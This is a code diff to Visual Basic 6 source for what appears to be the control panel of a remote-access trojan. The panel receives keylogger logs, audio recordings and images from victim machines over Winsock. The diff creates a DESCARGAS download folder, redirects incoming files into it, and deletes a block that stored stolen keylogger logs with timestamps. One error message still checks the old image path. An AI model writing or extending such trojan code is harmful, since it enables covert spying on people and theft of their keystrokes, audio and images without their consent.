@@ -263,6 +263,11 @@ aniCursor1.CursorOn Command4.hwnd
 End Sub
 
 Private Sub Form_Load()
+
+    If PathFileExists(App.path & "\DESCARGAS") = False Then
+        MkDir App.path & "\DESCARGAS"
+    End If
+            
     Flag = False
     contador = False
     
@@ -452,7 +457,7 @@ Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
  
         'name = App.path & "\imagenes\img" & Day(Now) & Month(Now) & Hour(Now) & Minute(Now) & ".jpg"
         
-        Open App.path & "\" & vData(3) For Binary Access Write As #1
+        Open App.path & "\DESCARGAS\" & vData(3) For Binary Access Write As #1
             
         ElseIf Mid(vData, 1, 9) = "|informa|" Then
         
@@ -526,20 +531,6 @@ Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
             'Mostrar mensaje de finalización
             'DeleteFile App.path & "\image.bmp"
             
-            If PathFileExists(App.path & "\DESCARGAS") = False Then
-                MkDir App.path & "\DESCARGAS"
-            End If
-            
-            If PathFileExists(App.path & "\keylogger.txt") Then
-                If FileLen(App.path & "\keylogger.txt") >= lFileSize Then
-                    Sleep 1000
-                    lista.List1.ListItems.Add , , "[ El keylogger se ha recibido con exito en la carpeta del troyano, DESCARGAS\keylogger.txt ]"
-                    CopyFile App.path & "\keylogger.txt", App.path & "\DESCARGAS\keylogger " & Month(Now) & "-" & Day(Now) & "-" & Year(Now) & "- " & Hour(Now) & "-" & Minute(Now) & "-" & Second(Now) & ".txt", False
-                    DeleteFile App.path & "\keylogger.txt"
-                Else
-                    lista.List1.ListItems.Add , , "[ Error al recibir el log del keylogger, intentelo nuevamente ]"
-                    End If
-            End If
             
             If PathFileExists(App.path & "\sonido.wav") Then
                 If FileLen(App.path & "\sonido.wav") >= lFileSize Then
@@ -555,9 +546,9 @@ Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
             End If
             
             On Error Resume Next
-            If PathFileExists(App.path & "\img.jpg") Then
-                If FileLen(App.path & "\img.jpg") >= lFileSize Then
-                    Foto.Picture1.Picture = LoadPicture(App.path & "\img.jpg")
+            If PathFileExists(App.path & "\DESCARGAS\img.jpg") Then
+                If FileLen(App.path & "\DESCARGAS\img.jpg") >= lFileSize Then
+                    Foto.Picture1.Picture = LoadPicture(App.path & "\DESCARGAS\img.jpg")
                 Else
                     lista.List1.ListItems.Add , , "[ Imagen dañada o perdida, por favor intentelo nuevamente " & FileLen(App.path & "\img.jpg") & "/" & lFileSize & "bytes ]"
                 End If
